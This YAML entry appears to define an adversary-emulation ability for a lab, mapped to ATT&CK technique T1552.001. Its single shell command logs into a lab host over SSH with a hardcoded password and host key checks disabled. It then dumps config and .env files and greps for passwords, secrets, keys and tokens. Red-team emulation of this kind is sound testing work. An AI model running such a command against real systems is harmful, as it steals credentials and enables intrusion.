- id: ca03-config-creds
  name: Config File Credential Extraction
  description: Extract plaintext credentials from application config files
  tactic: credential-access
  technique:
    attack_id: T1552.001
    name: Unsecured Credentials - Credentials in Files
  platforms:
    linux:
      sh:
        command: |
          sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@10.0.20.21 'cat /opt/app/config/database.conf /opt/app/config/app.env /opt/.env 2>/dev/null; grep -rE "password|secret|key|token" /opt/app/ 2>/dev/null | head -15' 2>/dev/null

  singleton: false
  repeatable: false
